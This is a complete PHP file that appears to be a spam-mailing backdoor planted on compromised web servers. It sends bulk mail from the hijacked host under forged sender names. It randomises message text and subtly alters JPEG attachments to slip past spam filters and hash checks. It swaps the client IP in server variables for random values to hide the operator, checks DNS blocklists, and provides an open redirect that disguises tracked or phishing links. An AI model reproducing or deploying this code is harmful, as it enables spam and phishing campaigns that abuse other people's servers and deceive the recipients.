<?php

@error_reporting(0);
@set_time_limit(150);
@ignore_user_abort(true);
@ini_set('max_execution_time',150);


if($_REQUEST['r']){
	$n_st='';$n_st1='';$n_st2='?';
	$d_st = base64_decode($_REQUEST['r']);
	$d_st1 = explode('&',trim($d_st));
	for($i=0;$i<sizeof($d_st1);$i++)
	 {	 $d_st2=explode('=',trim($d_st1[$i]));
		 if ($d_st2[0]=='l')
		   { $n_st=$d_st2[1];  } else
		   {  $n_st1.=$n_st2.$d_st2[0].'='.$d_st2[1];
			  $n_st2='&';  }; };
	 $n_st.=$n_st1;
	?> <meta http-equiv="refresh" content="0;url=<?php echo $n_st; ?>"><?php exit();
}

if($_SERVER['REQUEST_METHOD']=='GET'){
	exit('OK');
}

$randString=rand(1,255).'.'.rand(0,255).'.'.rand(0,255).'.'.rand(0,255);

$compare=$_SERVER['REMOTE_ADDR'];

while($key=key($_SERVER)){
	if($_SERVER[$key]==$compare){
		@$_SERVER[$key]=$randString;
	}
	next($_SERVER);
}

if(isset($_POST['ch'])===true){
	Check(); exit;
}if(isset($_POST['sn'])===true){
	Send(); exit;
}

function Send(){
	$replyto=urldecode($_POST['rpt']);
	//echo $replyto."Send()  !".strstr($replyto,'|')."!";
	if(strstr($replyto,'|')){
		//echo "OK()  !";
		$rand=explode('|',$replyto);
		$replyto=$rand[array_rand($rand)];
	}
	
	$domain = $_SERVER["HTTP_HOST"];
	$domain=str_replace('www.','', $domain);
	$domain_=explode('.',$domain);
	
	$_POST['m']=str_replace('[shelldomain:]',ucfirst($domain_[0]),$_POST['m']);
    //echo $_POST['m'];
	$replyto=check_gmail($replyto);
    
	$emails=urldecode($_POST['em']);
    
	$ex=explode("\n",$emails);
	global $randm_array;//память все randm замен, две переменные - шаблон и rand
	
	if(!is_file($_FILES['file']['tmp_name'])){
		for($c=0,$max=sizeof($ex);$c<$max;$c++){
			$data=explode('|',trim($ex[$c]));
			$r_from=Random(dataHandler($_POST['f']),$data);
			$r_subject=dataHandler($_POST['s']); $r_message=$_POST['m'];
			$r_subject=str_ireplace('[from:]',$r_from,$r_subject);
			$r_subject=str_ireplace('[email:]',$data[0],$r_subject);
			$r_subject=Random($r_subject,$data);
			$r_message=str_ireplace('[from:]',$r_from,$r_message);
			$r_message=str_ireplace('[email:]',$data[0],$r_message);
			$r_message=Random($r_message,$data);
			//$from_name=randText();
			$from_name=str_replace(' ','',$r_from);
			if (strlen($from_name)<1) { $from_name=randText(); };
			
			if($replyto==''){
				$reply=$from_name.'@'.$_SERVER['HTTP_HOST'];
			}else{
				$reply=$replyto;
			}
			
			//echo":2-".$reply."-2:";

			if(!SMail($data[0],$r_from,$r_message,$r_subject,$reply,$from_name)){
				print '*send:bad*'; exit;
			}
		}
	}else{
		for($c=0,$max=sizeof($ex);$c<$max;$c++){
			$data=explode('|',trim($ex[$c]));
			$r_from=Random(dataHandler(urldecode($_POST['f'])),$data);
			$r_subject=dataHandler(urldecode($_POST['s']));
			$r_message=urldecode($_POST['m']);
			$r_subject=str_ireplace('[from:]',$r_from,$r_subject);
			$r_subject=str_ireplace('[email:]',$data[0],$r_subject);
			$r_subject=Random($r_subject,$data);
			$r_message=str_ireplace('[from:]',$r_from,$r_message);
			$r_message=str_ireplace('[email:]',$data[0],$r_message);
			$r_message=Random($r_message,$data);
			//$from_name=randText();
			$from_name=str_replace(' ','',$r_from);
			if (strlen($from_name)<1) { $from_name=randText(); };
			
			if($replyto==''){
				$reply=$from_name.'@'.$_SERVER['HTTP_HOST'];
			}else{
				$reply=$replyto;
			}

			if(!SendAttach($data[0],$r_from,$r_message,$r_subject,$reply,$from_name)){
				print '*send:bad*'; exit;
			}
		}
	}
	//echo"<br><br>from_name:".$from_name." ";
	//echo"<br><br>subject:".$r_subject." ";
	
	print '*send:ok*'; exit;
}

function SMail($to,$from,$message,$subject,$replyto,$from_name){
	if($_POST['tp']=='1'){ $type='text/html'; }
	else{ $type='text/plain'; }
	$header='From: =?utf-8?B?'.base64_encode($from).'?= <'.$from_name.'@'.$_SERVER['HTTP_HOST'].">\r\n";
	$header.='MIME-Version: 1.0'."\r\n";
	$header.='Content-Type: '.$type.'; charset="utf-8"'."\r\n";
	$header.='Reply-To: '.$replyto."\r\n";
	$header.='X-Mailer: PHP/'.phpversion();

	if(mail($to,$subject,$message,$header)){
		return true;
	}
	return false;
}

function SendAttach($to,$from,$message,$subject,$replyto,$from_name){
	$boundary=md5(uniqid()); $fileString=fileString($_FILES['file']['name']);
	if($_POST['tp']=='1'){ $type='text/html'; }
	else{ $type='text/plain'; }
	$filename=$_POST['fn'];

	$headers='MIME-Version: 1.0'."\r\n";
	$headers.='From: =?utf-8?B?'.base64_encode($from).'?= <'.$from_name.'@'.$_SERVER['HTTP_HOST'].'>'."\r\n";
	$headers.='Reply-To: '.$replyto."\r\n";
	$headers.='X-Mailer: PHP/'.phpversion()."\r\n";
	$headers.='Content-Type: multipart/mixed; boundary="'.$boundary."\"\r\n\r\n";

	$body='--'.$boundary."\r\n";
	$body.='Content-Type: '.$type.'; charset="utf-8"'."\r\n";
	$body.='Content-Transfer-Encoding: base64'."\r\n\r\n";
	$body.=chunk_split(base64_encode($message));

	$body.= '--'.$boundary."\r\n";
	$body.='Content-Type: '.$_FILES['file']['type'].'; name="'.$filename.'"'."\r\n";
	$body.='Content-Disposition: attachment; filename="'.$filename.'"'."\r\n";
	$body.='Content-Transfer-Encoding: base64'."\r\n";
	$body.='X-Attachment-Id: '.rand(1000,99999)."\r\n\r\n";
	$body.=chunk_split(base64_encode($fileString));

	if(mail($to,$subject,$body,$headers)){
		return true;
	}
	return false;
}

function dataHandler($data){
	$ex=explode("\n",$data);

	if(sizeof($ex)>1){
		return trim($ex[rand(0,sizeof($ex)-1)]);
	}
	return trim($data);
}

function Random($text,$data){
	global $randm_array;
	preg_match_all('#\[num:(.+?)\]#is',$text,$result2); $i=0;
	preg_match_all('#\[randM:(.+?)\]#is',$text,$result3); $q=0;
	preg_match_all('#\[randstr:(.+?)\]#is',$text,$result4); $w=0;
	preg_match_all('#\[var:(.+?)\]#is',$text,$result5); $e=0;
	preg_match_all('#\{rand:(.+?)\}#is',$text,$result6); $f=0;
	preg_match_all('#\[redirect:(.+?)\]#is',$text,$result7); $h=0;
	
	while($h<sizeof($result7[1])){
		$link_site='';
		$link_par1=explode('>>>',$result7[1][$h]);
		$current_url_='';
		//print_r($link_par1);
		preg_match_all('#\{rand:(.+?)\}#is',$link_par1[0],$link_par2);
		if (sizeof($link_par2[1])>0)//есть rand
		  {
			 $link_par3 = explode('|',$link_par2[1][0]);
		     $link_site = $link_par3[array_rand($link_par3)];
	      } else 
	      {
			 $link_site = $link_par1[0];
		  };
	    $link_site = "l=".$link_site;
	    
	    for($i_link=1;$i_link<sizeof($link_par1);$i_link++)
	       {
			  $link_par1[$i_link] = str_replace("{","",$link_par1[$i_link]);
			  $link_par1[$i_link] = str_replace("}","",$link_par1[$i_link]);
			  if (strpos($link_par1[$i_link],'email:')!==false)
			    {
					$link_site.="&e=".trim($data[0]);
			    } else
			  if (strpos($link_par1[$i_link],'var:')!==false)
			    {
					$link_par4=explode(':',$link_par1[$i_link]);
					$link_site.="&v".$link_par4[1]."=".trim($data[$link_par4[1]]);
			    }else 
			  if (strpos($link_par1[$i_link],'link:')!==false)
			    {
					$link_par4=explode(':',$link_par1[$i_link],2);
					$current_url_=$link_par4[1];
			    }else 
			    { $link_site.="&".$link_par1[$i_link]; };
			  
			  //print "-".$link_par1[$i_link];
		   };
		//print $link_site;
		if (strlen($current_url_)>0) { $current_url=$current_url_; }
		  else
		{ $current_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']; };
		
		$current_url.="?r=".base64_encode($link_site);
		$text=str_replace_once($result7[0][$h],$current_url,$text);
		$h++;
	}
	
	while($f<sizeof($result6[1])){
		$rand=explode('|',$result6[1][$f]);
		$rand=$rand[array_rand($rand)];
		
		$text=str_replace_once($result6[0][$f],$rand,$text); $f++;
	}
	
	while($i<sizeof($result2[1])){
		$rand=explode('|',$result2[1][$i]);
		if(!is_numeric($rand[0]) or !is_numeric($rand[1])){ continue; }
		$rand=rand($rand[0],$rand[1]);

		$text=str_replace_once($result2[0][$i],$rand,$text); $i++;
	}
    
	while($q<sizeof($result3[1])){
		$rand=explode('|',$result3[1][$q]);
		//$rand=$rand[array_rand($rand)];
        
		//находим, использовался ли данный шаблон раньше (в from и/или subject)
		$flag_r=false;
		for($i_link=0;$i_link<sizeof($result3[1]);$i_link++)
		   {
			   if ($result3[0][$q]==$randm_array[$i_link][0])
			     {
					 $rand=$randm_array[$i_link][1];
					 $flag_r=true;
					 break;
			     };
		   };
		if ($flag_r==false)
		  {   
			  $rand=$rand[array_rand($rand)];
			  $randm_array[]=array($result3[0][$q],$rand);
		  };
        
		$text=str_replace($result3[0][$q],$rand,$text); $q++;
	}

	while($w<sizeof($result4[1])){
		$rand=explode('|',$result4[1][$w]);
		if(!is_numeric($rand[0]) or !is_numeric($rand[1])){ continue; }
		$rand=randString($rand[0],$rand[1]);

		$text=str_replace_once($result4[0][$w],$rand,$text); $w++;
	}
    
	while($e<sizeof($result5[1])){
		if(!is_numeric($result5[1][$e])){ continue; }
		//echo $result5[0][$e]." - ".$data[$result5[1][$e]]."<br>";
		$text=str_replace($result5[0][$e],$data[$result5[1][$e]],$text); $e++;
	}

	preg_match_all('#\[rand:(.+?)\]#is',$text,$result); $c=0;

	while($c<sizeof($result[1])){
		$rand=explode('|',$result[1][$c]);
		$rand=$rand[array_rand($rand)];

		$text=str_replace_once($result[0][$c],$rand,$text); $c++;
	}

	return $text;
}

function Check(){
	$crlf="\r\n";

	if(isset($_POST['st'])===true){
		print '*valid:ok*'.$crlf;
	}if(isset($_POST['m'])===true){
		if(function_exists('mail')){
			$ex=explode(':',$_POST['m']);
			$email=$ex[0]; $attach=$ex[1]; $reply=$ex[2];
			$from_name=randText();
			$replyto=$from_name.'@'.$_SERVER['HTTP_HOST'];
			if($reply=='1'){ $replyto=$email; }
			if($attach=='1'){
				if(CheckAttach($email,$replyto,$from_name)){
					print '*mail:ok*'.$crlf;
				}else{
					print '*mail:bad*'.$crlf;
				}
			}else{
				if(CheckMail($email,$replyto,$from_name)){
					print '*mail:ok*'.$crlf;
				}else{
					print '*mail:bad*'.$crlf;
				}
			}
		}else{
			print '*mail:bad*'.$crlf;
		}
	}if(isset($_POST['rb'])===true){
		$rbl=rbl();
		if($rbl==''){
			print '*rbl:ok*';
		}else{
			print '*rbl:'.$rbl.'*';
		}
	}
}

function randString($min,$max){
	$str='qwertyuiopasdfghjklzxcvbnm';
	$size=rand($min,$max); $result='';

	for($c=0;$c<$size;$c++){
		$result.=$str{rand(0,strlen($str)-1)};
	}
	return $result;
}

function rbl(){
    $dnsbl_check=array('b.barracudacentral.org','xbl.spamhaus.org','sbl.spamhaus.org','zen.spamhaus.org','bl.spamcop.net');
	$ip=gethostbyname($_SERVER['HTTP_HOST']); $result='';

    if($ip){
        $rip=implode('.',array_reverse(explode('.',$ip)));
        foreach($dnsbl_check as $val){
            if(checkdnsrr($rip.'.'.$val.'.','A'))
                $result.=$val.', ';
        }
        if(strlen($result)>2){ return substr($result,0,-2); }
        else{ return ''; }
    }else{
    	return '*rbl:unknown*';
    }
    return '';
}

function CheckMail($to,$reply,$from_name){
	$header='From: '.'=?utf-8?B?'.base64_encode(randText()).'?='.' <'.$from_name.'@'.$_SERVER['HTTP_HOST'].">\r\n";
	$header.='MIME-Version: 1.0'."\r\n";
	$header.='Content-Type: text/html; charset="utf-8"'."\r\n";
	$header.='Reply-To: '.$reply."\r\n";
	$header.='X-Mailer: PHP/'.phpversion();

	$message=text();
	$subject=$_SERVER['HTTP_HOST'];

	if(mail($to,$subject,$message,$header)){
		return true;
	}
	return false;
}

function CheckAttach($to,$reply,$from_name){
	$message=text();
	$subject=$_SERVER['HTTP_HOST'];
	$filename=filename('1.txt'); $boundary=md5(uniqid());

	$headers='MIME-Version: 1.0'."\r\n";
	$headers.='From: '.'=?utf-8?B?'.base64_encode(randText()).'?='.' <'.$from_name.'@'.$_SERVER['HTTP_HOST'].'>'."\r\n";
	$headers.='Reply-To: '.$reply."\r\n";
	$headers.='X-Mailer: PHP/'.phpversion()."\r\n";
	$headers.='Content-Type: multipart/mixed; boundary="'.$boundary."\"\r\n\r\n";

	$body='--'.$boundary."\r\n";
	$body.='Content-Type: text/html; charset="utf-8"'."\r\n";
	$body.='Content-Transfer-Encoding: base64'."\r\n\r\n";
	$body.=chunk_split(base64_encode($message));

	$body.= '--'.$boundary."\r\n";
	$body.='Content-Type: text/plain; name="'.$filename.'"'."\r\n";
	$body.='Content-Disposition: attachment; filename="'.$filename.'"'."\r\n";
	$body.='Content-Transfer-Encoding: base64'."\r\n";
	$body.='X-Attachment-Id: '.rand(1000,99999)."\r\n\r\n";
	$body.= chunk_split(base64_encode(text()));

	if(mail($to,$subject,$body,$headers)){
		return true;
	}
	return false;
}

function str_replace_once($search,$replace,$text){ 
   $pos=strpos($text, $search);
   return $pos!==false ? substr_replace($text,$replace,$pos,strlen($search)) : $text;
}

function filename($name){
	$format=end(explode('.',$name));
	$array[]='SDC'; $array[]='P'; $array[]='DC'; $array[]='CAM'; $array[]='IMG-';
	$img=array('png','jpg','gif','jpeg','bmp');

	for($c=0,$max=sizeof($img);$c<$max;$c++){
		if(strtolower($format)==$img[$c]){
			$rand=rand(10,999999);
			return $array[rand(0,4)].$rand.'.'.$format;
		}
	}
	return randText().'.'.$format;
}

function fileString($name){
	$format=end(explode('.',$name));

	if(strtolower($format)=='jpeg' or strtolower($format)=='jpg'){
		if(CheckRandIMG()){
			return RandIMG($_FILES['file']['tmp_name']);
		}
	}
	return file_get_contents($_FILES['file']['tmp_name']);
}

function randText(){
	$str='qwertyuiopasdfghjklzxcvbnm';
	$size=rand(3,8); $result='';

	for($c=0;$c<$size;$c++){
		$result.=$str{rand(0,strlen($str)-1)};
	}
	return $result;
}

function text(){
	$str='qwertyuiopasdfghjklzxcvbnm';
	$size=rand(9,20); $result='';

	for($c=0;$c<$size;$c++){
		$rand=rand(6,10);
		
		for($i=0;$i<$rand;$i++){
			$result.=$str{rand(0,strlen($str)-1)};
		}
		$sign=array(' ',' ',' ',' ',', ','? ','. ','. ');
		$result.=$sign[rand(0,7)];
	}
	return trim($result);
}

function CheckRandIMG(){
	$array=array(
		'getimagesize',
		'imagecreatetruecolor',
		'imagecreatefromjpeg',
		'imagecopyresampled',
		'imagefilter',
		'ob_start',
		'imagejpeg',
		'ob_get_clean'
	);

	for($c=0,$max=sizeof($array);$c<$max;$c++){
		if(!function_exists($array[$c])){
			return false;
		}
	}
	return true;
}

function RandIMG($file){
	$rand['width']=rand(1,2);
	$rand['height']=rand(1,2);
	$rand['quality']=rand(1,2);
	$rand['brightness']=rand(1,2);
	$rand['contrast']=rand(1,2);

	list($width,$height)=getimagesize($file);

	if($rand['width']==1){
		$sign=rand(1,2);
		if($sign==1){
			$new_width=$width+rand(1,10);
		}else{
			$new_width=$width-rand(1,10);
		}
	}else{
		$new_width=$width;
	}if($rand['height']==1){
		$sign=rand(1,2);
		if($sign==1){
			$new_height=$height+rand(1,10);
		}else{
			$new_height=$height-rand(1,10);
		}
	}else{
		$new_height=$height;
	}if($rand['quality']==1){
		$quality=75;
	}else{
		$quality=rand(65,105);
	}if($rand['brightness']==1){
		$brightness=rand(0,35);
	}else{
		$brightness=0;
	}if($rand['contrast']==1){
		$sign=rand(1,2);
		if($sign==1){ $sign='+'; }else{ $sign='-'; }
		$contrast=rand(1,15);
	}else{
		$sign='';
		$contrast=0;
	}

	$image_p=imagecreatetruecolor($new_width,$new_height);
	$image=imagecreatefromjpeg($file);
	imagecopyresampled($image_p, $image,0,0,0,0,$new_width,$new_height,$width,$height);
	imagefilter($image_p,IMG_FILTER_CONTRAST,$sign.$contrast);
	imagefilter($image_p,IMG_FILTER_BRIGHTNESS,$brightness);
	ob_start();
	imagejpeg($image_p,null,$quality);
	$out=ob_get_clean();
	imagedestroy($image_p);

	return $out;
}

function check_gmail($email){
	$email=str_replace('[','',strtolower(trim($email)));
	$email=str_replace(']','',$email);
	//$email=str_replace(',','',$email);
	return $email;
	/*if(strstr($email,'@gmail.')){
		return RandGmail($email);
	}else{
		return $email;
	}*/
}

function RandGmail($email){
	$login=explode('@',$email); $result='';
	$login=strtolower(str_replace('.','',$login[0]));

	$size=strlen($login);

	for($c=0,$max=$size;$c<$max;$c++){
		$up=rand(0,1); $dot=rand(0,1);

		$symbol=$login{$c};

		if($up==1){
			$symbol=strtoupper($symbol);
		}if($dot==1){
			$symbol=$symbol.'.';
		}
		$result.=$symbol;
	}

	if(substr($result,-1)=='.'){
		$result=substr($result,0,-1);
	}

	return $result.'@gmail.com';
}

?>
